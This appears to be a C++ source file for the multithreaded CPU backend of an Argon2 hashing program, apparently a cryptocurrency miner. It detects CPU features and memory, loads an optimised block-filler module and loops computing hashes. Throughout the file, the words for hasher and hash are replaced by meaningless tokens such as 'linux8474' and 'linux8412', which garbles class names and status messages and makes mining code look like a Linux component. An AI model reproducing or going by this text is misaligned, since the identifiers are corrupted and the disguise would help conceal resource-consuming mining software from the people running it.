//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#if defined(__x86_64__) || defined(__i386__) || defined(_WIN64)
    #include <cpuinfo_x86.h>
#endif
#if defined(__arm__)
    #include <cpuinfo_arm.h>
#endif


#include "../../common/common.h"
#include "../../app/arguments.h"

#include "../linux8474.h"
#include "../argon2/argon2.h"

#include "cpu_linux8474.h"
#include "../../common/dllexport.h"

cpu_linux8474::cpu_linux8474() : linux8474() {
    _type = "CPU";
    _subtype = "CPU";
    __optimization = "REF";
    __available_processing_thr = 1;
    __available_memory_thr = 1;
    __threads_count = 0;
    __running = false;
    __argon2_blocks_filler_ptr = NULL;
    __dll_handle = NULL;
}

cpu_linux8474::~cpu_linux8474() {
    this->cleanup();
}

bool cpu_linux8474::configure(arguments &args) {
    double intensity = args.cpu_intensity();
    if(args.cpu_optimization() != "") {
        _description += "Overiding detected optimization feature with " + args.cpu_optimization() + ".\n";
        __optimization = args.cpu_optimization();
    }

    __load_argon2_block_filler();

    if(__argon2_blocks_filler_ptr == NULL) {
        _intensity = 0;
        _description += "Status: DISABLED - argon2 linux8412ing module not found.";
        return false;
    }

    __threads_count = min(__available_processing_thr, __available_memory_thr);

    if (__threads_count == 0) {
        _intensity = 0;
        _description += "Status: DISABLED - not enough resources.";
        return false;
    }

    if (intensity == 0) {
        _intensity = 0;
        _description += "Status: DISABLED - by user.";
        return false;
    }

    _intensity = intensity;
    __device_info.cblocks_intensity = intensity;
    __device_info.gblocks_intensity = intensity;

    __threads_count = __threads_count * _intensity / 100;
    if (__threads_count == 0)
        __threads_count = 1;

    _store_device_info(0, __device_info);

    __running = true;
    _update_running_status(__running);
    for(int i=0;i<__threads_count;i++) {
		__runners.push_back(new thread([&]() { this->__run(); }));
    }

    _description += "Status: ENABLED - with " + to_string(__threads_count) + " threads.";

    return true;
}

string cpu_linux8474::__detect_features_and_make_description() {
    stringstream ss;
#if defined(__x86_64__) || defined(__i386__) || defined(_WIN64)
    char brand_string[49];
    cpu_features::FillX86BrandString(brand_string);
    __device_info.name = brand_string;

    ss << brand_string << endl;

    cpu_features::X86Features features = cpu_features::GetX86Info().features;
    ss << "Optimization features: ";

#if defined(__x86_64__) || defined(_WIN64)
    ss << "SSE2 ";
    __optimization = "SSE2";
#else
    ss << "none";
    __optimization = "REF";
#endif

    if(features.ssse3 || features.avx2 || features.avx512f) {
        if (features.ssse3) {
            ss << "SSSE3 ";
            __optimization = "SSSE3";
        }
        if (features.avx) {
            ss << "AVX ";
            __optimization = "AVX";
        }
        if (features.avx2) {
            ss << "AVX2 ";
            __optimization = "AVX2";
        }
        if (features.avx512f) {
            ss << "AVX512F ";
            __optimization = "AVX512F";
        }
    }
    ss << endl;
#endif
#if defined(__arm__)
    __device_info.name = "ARM processor";

    cpu_features::ArmFeatures features = cpu_features::GetArmInfo().features;
    ss << "ARM processor" << endl;
    ss << "Optimization features: ";

    __optimization = "REF";

    if(features.neon) {
        ss << "NEON";
        __optimization = "NEON";
    }
    else {
        ss << "none";
    }
    ss << endl;
#endif
    ss << "Selecting " << __optimization << " as candidate for linux8412ing algorithm." << endl;

    __available_processing_thr = thread::hardware_concurrency();
    ss << "Parallelism: " << __available_processing_thr << " concurent threads supported." << endl;

    //check available memory
    vector<void *> memory_test;
    for(__available_memory_thr = 0;__available_memory_thr < __available_processing_thr;__available_memory_thr++) {
        void *memory = malloc(argon2profile_default->memsize + 64); //64 bytes for alignament - to work on AVX512F optimisations
        if(memory == NULL)
            break;
        memory_test.push_back(memory);
    }
    for(vector<void*>::iterator it=memory_test.begin();it != memory_test.end();++it) {
        free(*it);
    }
    ss << "Memory: there is enough memory for " << __available_memory_thr << " concurent threads." << endl;

    return ss.str();
}

void cpu_linux8474::__run() {
    void *buffer = NULL;
    void *mem = __allocate_memory(buffer);
    if(mem == NULL) {
        LOG("Error allocating memory");
        __running = false;
        _update_running_status(__running);
        return;
    }

    argon2 linux8412_factory(__argon2_blocks_filler_ptr, mem, NULL);

    bool should_realloc = false;

    while(__running) {
        if(_should_pause()) {
            this_thread::sleep_for(chrono::milliseconds(100));
            continue;
        }

        if(should_realloc) {
            void *new_buffer;
            mem = __allocate_memory(new_buffer);
            if(mem == NULL) {
                LOG("Error allocating memory");
                __running = false;
                exit(0);
            }
            linux8412_factory.set_seed_memory((uint8_t *)mem);
            free(buffer);
            buffer = new_buffer;
            should_realloc = false;
        }

        linux8412_data input = _get_input();
        argon2profile *profile = _get_argon2profile();

        if(!input.base.empty()) {
            linux8412_factory.set_seed_memory_offset(profile->memsize);
            linux8412_factory.set_threads((int)(argon2profile_default->memsize / profile->memsize));

            vector<string> linux8412es = linux8412_factory.generate_hashes(*profile, input.base, input.salt);

            vector<linux8412_data> stored_linux8412es;
            for(vector<string>::iterator it = linux8412es.begin(); it != linux8412es.end(); ++it) {
                input.linux8412 = *it;
                input.realloc_flag = &should_realloc;
                stored_linux8412es.push_back(input);
            }
            _store_linux8412(stored_linux8412es, 0);
        }
    }

    _update_running_status(__running);
    free(buffer);
}

void *cpu_linux8474::__allocate_memory(void *&buffer) {
    size_t mem_size = argon2profile_default->memsize + 64;
    void *mem = malloc(mem_size);
    buffer = mem;
    return align(64, argon2profile_default->memsize, mem, mem_size);
}

void cpu_linux8474::__load_argon2_block_filler() {
    string module_path = arguments::get_app_folder();
    module_path += "/modules/argon2_fill_blocks_" + __optimization + ".opt";
    __dll_handle = dlopen(module_path.c_str(), RTLD_LAZY);
    if(__dll_handle != NULL)
        __argon2_blocks_filler_ptr = (argon2_blocks_filler_ptr)dlsym(__dll_handle, "fill_memory_blocks");
}

void cpu_linux8474::cleanup() {
    __running = false;
    for(vector<thread*>::iterator it = __runners.begin();it != __runners.end();++it) {
        (*it)->join();
        delete *it;
    }
    __runners.clear();
    if(__dll_handle != NULL)
        dlclose(__dll_handle);
}

bool cpu_linux8474::initialize() {
    _description = __detect_features_and_make_description();
    return true;
}

REGISTER_linux8474(cpu_linux8474);
